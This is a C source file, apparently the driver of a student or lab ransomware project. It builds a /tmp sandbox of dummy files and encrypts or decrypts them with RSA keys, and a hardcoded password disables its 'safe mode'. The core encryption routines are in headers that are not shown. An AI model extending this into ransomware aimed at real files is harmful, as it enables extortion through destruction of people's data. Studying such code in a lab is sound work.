#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/decoder.h>

#include "files_finder.h"
#include "crypto_rsa.h"

int g_safeMode = 1;
int g_encryption = 0;
int g_decryption = 0;

/**
 * @brief Initialize an area with useless files to execute the ransomware in safe mode.
*/
void init_safe_mode_area()
{

    char* p_sandboxPath = "/tmp/sandbox-ransomware";

    printf("[+] Initializing safe mode area\n");

    /* Test if sandbox environment already exist */
    struct stat sb;

    if (stat(p_sandboxPath, &sb)){

        /* Create sandbox directory in /tmp/ */
        if (mkdir(p_sandboxPath, 0777) == -1)
        {
            perror("[-] Sandbox directory creation failed");
            exit(1);
        }

        /* Create useless files in sandbox directory */
        char* p_files[] = {"file1", "file2", "file3", "file4", "file5"};
        for (int i = 0; i < 5; i++)
        {
            /* Allocate memory to files path */
            char* p_filePath = malloc(strlen(p_sandboxPath) + strlen(p_files[i]) + 2);
            if (p_filePath == NULL)
            {
                perror("[-] Sandbox files creation failed");
                exit(1);
            }
            sprintf(p_filePath, "%s/%s", p_sandboxPath, p_files[i]);
            FILE* p_file = fopen(p_filePath, "w");
            if (p_file == NULL)
            {
                perror("[-] Sandbox files creation failed");
                exit(1);
            }

            /* Fill files with data */
            fprintf(p_file, "This is a useless file\n");

            /* Close file descriptor */
            fclose(p_file);

            /* Free memory */
            free(p_filePath);
        }
    }

    printf("[+] Safe mode area initialized\n");

}

int main(int argc, char const *argv[])
{

    char* paths[] = {"/tmp/sandbox-ransomware/"};

    /* Parse options */
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--disableSM") == 0)
        {
            if (strcmp(argv[i+1], "286755fad04869ca523320acce0dc6a4") == 0)
            {
                printf("[+] Safe mode disabled\n");
                g_safeMode = 0;
            }
        } else if (strcmp(argv[i], "--encrypt") == 0)
        {
            g_encryption = 1;
        } else if (strcmp(argv[i], "--decrypt") == 0)
        {
            g_decryption = 1;
        }
    }

    if (!g_encryption && !g_decryption)
    {
        printf("[-] No action specified\n");
        exit(1);
    }

    if (g_encryption && g_decryption)
    {
        printf("[-] Can't encrypt and decrypt at the same time\n");
        exit(1);
    }

    if (g_safeMode && g_encryption)
    {
        printf("[+] Ransomware in safe mode\n");
        init_safe_mode_area();
    }

    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    print_path_data(p_listFileData);

    if (g_encryption)
    {
        /* Get RSA public key from a file */
        EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);

        printf("[+] Encryption key GET success\n");

        /* Encrypt files */
        printf("[+] Encrypting files\n");
        rsa_encrypt_files(p_listFileData, p_pubKey);
        printf("[+] Files encrypted\n");

        EVP_PKEY_free(p_pubKey);
    }

    if (g_decryption)
    {
        /* Get RSA private key from a file */
        EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);

        printf("[+] Encryption key GET success\n");

        /* Decrypt files */
        printf("[+] Decrypting files\n");
        rsa_decrypt_files(p_listFileData, p_privKey);
        printf("[+] Files decrypted\n");

        EVP_PKEY_free(p_privKey);
    }


    free_path_data(p_listFileData);
    return 0;
}
